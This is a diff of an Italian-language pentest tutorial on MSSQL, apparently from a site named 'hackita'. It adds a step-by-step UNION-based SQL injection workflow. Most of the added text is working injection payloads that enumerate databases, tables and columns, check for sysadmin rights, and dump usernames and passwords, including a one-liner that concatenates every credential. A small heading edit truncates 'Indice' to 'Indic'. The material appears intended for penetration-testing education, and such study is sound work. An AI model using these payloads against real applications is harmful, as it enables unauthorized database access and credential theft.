@@ -41,7 +41,7 @@ In entrambi i casi l'obiettivo è lo stesso: arrivare a privilegi SQL utili per 
 
 ***
 
-## Indice
+## Indic
 
 1. [Perché MSSQL è un target ad alto valore](#1)
 2. [Enumerazione Porta 1433](#2)
@@ -549,6 +549,9 @@ X-Originating-IP: 1' OR 1=1-- -
 ' UNION SELECT 1,2,3-- -
 ```
 
+**Come interpretare ORDER BY:**
+Se `ORDER BY 6` non dà errore e `ORDER BY 7` crasha → la query ha **6 colonne**. La tua UNION deve avere esattamente 6 valori.
+
 ### Trova le colonne visibili a schermo
 
 ```sql
@@ -559,34 +562,98 @@ X-Originating-IP: 1' OR 1=1-- -
 
 Quando "hackita" appare nella pagina → quella è la colonna che usi per estrarre i dati.
 
-### Enumera e dumpa
+***
+
+### Flusso pratico: da zero al dump
+
+Hai trovato che la query ha 6 colonne e la colonna visibile è la 2. Segui questo ordine — uno step alla volta.
+
+**Step 1 — Conferma la colonna visibile**
 
 ```sql
--- Recon iniziale
-' UNION SELECT NULL,DB_NAME(),NULL-- -
-' UNION SELECT NULL,@@VERSION,NULL-- -
-' UNION SELECT NULL,SYSTEM_USER,NULL-- -
-' UNION SELECT NULL,@@SERVERNAME,NULL-- -
+' UNION SELECT NULL,'hackita',NULL,NULL,NULL,NULL-- -
+```
 
--- Lista database
-' UNION SELECT NULL,name,NULL FROM master..sysdatabases-- -
-' UNION SELECT NULL,DB_NAME(0),NULL-- -     → cambia 0,1,2,3...
+Vedi "hackita" nella pagina → colonna 2 confermata. Ora usi sempre la posizione 2 per estrarre dati.
 
--- Lista tabelle
-' UNION SELECT NULL,table_name,NULL FROM NomeDB.information_schema.tables-- -
-' UNION SELECT NULL,name,NULL FROM NomeDB..sysobjects WHERE xtype='U'-- -
+**Step 2 — Enumera i database**
 
--- Lista colonne
-' UNION SELECT NULL,column_name,NULL FROM NomeDB.information_schema.columns WHERE table_name='NomeTabella'-- -
+Metti `name` nella colonna visibile, `FROM master..sysdatabases` in fondo:
 
--- Dump dati
-' UNION SELECT NULL,username,password FROM NomeDB..NomeTabella-- -
+```sql
+' UNION SELECT NULL,name,NULL,NULL,NULL,NULL FROM master..sysdatabases-- -
+```
 
--- Tutto in una riga (FOR XML PATH)
-' UNION SELECT NULL,(SELECT username+':'+password+' | ' FROM NomeDB..NomeTabella FOR XML PATH('')),NULL-- -
+Output: vedi i nomi dei database nella pagina. Ignora `master`, `model`, `msdb`, `tempdb` — cerca il DB dell'applicazione.
+
+**Step 3 — Enumera le tabelle**
+
+Sostituisci `NomeDB` con quello trovato al passo precedente:
+
+```sql
+' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM NomeDB.information_schema.tables-- -
+```
+
+Alternativa con sysobjects (funziona anche su versioni vecchie):
+
+```sql
+' UNION SELECT NULL,name,NULL,NULL,NULL,NULL FROM NomeDB..sysobjects WHERE xtype='U'-- -
+```
+
+Vedi `users`, `accounts`, `admin`? Quella è la prossima.
+
+**Step 4 — Enumera le colonne della tabella**
+
+```sql
+' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL FROM NomeDB.information_schema.columns WHERE table_name='users'-- -
+```
+
+Output: `id`, `username`, `password`, `email` → hai i nomi delle colonne.
+
+**Step 5 — Dumpa i dati**
+
+Una colonna alla volta:
+
+```sql
+' UNION SELECT NULL,username,NULL,NULL,NULL,NULL FROM NomeDB..users-- -
+' UNION SELECT NULL,password,NULL,NULL,NULL,NULL FROM NomeDB..users-- -
+```
+
+Username e password sulla stessa riga:
+
+```sql
+' UNION SELECT NULL,username+':'+password,NULL,NULL,NULL,NULL FROM NomeDB..users-- -
+```
+
+Tutti gli utenti concatenati in un blocco unico:
+
+```sql
+' UNION SELECT NULL,(SELECT username+':'+password+' | ' FROM NomeDB..users FOR XML PATH('')),NULL,NULL,NULL,NULL-- -
 ```
 
 ***
+
+### Dump rapido — altri dati utili
+
+```sql
+-- Chi sei sul DB
+' UNION SELECT NULL,SYSTEM_USER,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,DB_NAME(),NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,@@SERVERNAME,NULL,NULL,NULL,NULL-- -
+
+-- Sei sysadmin?
+' UNION SELECT NULL,IS_SRVROLEMEMBER('sysadmin'),NULL,NULL,NULL,NULL-- -
+
+-- Lista database alternativa (cambia indice 0,1,2,3...)
+' UNION SELECT NULL,DB_NAME(0),NULL,NULL,NULL,NULL-- -
+
+-- Tutte le tabelle di un DB in una riga
+' UNION SELECT NULL,(SELECT table_name+' | ' FROM NomeDB.information_schema.tables FOR XML PATH('')),NULL,NULL,NULL,NULL-- -
+```
+
+***
+
+> **Errore tipico:** scrivere `SELECT name, FROM tabella` con la virgola prima di FROM. La struttura corretta è sempre `SELECT val1, val2, val3 FROM tabella` — la FROM viene dopo tutti i valori, mai in mezzo.
 
 ## 8. Error-Based: Fai Parlare gli Errori {#8}
 
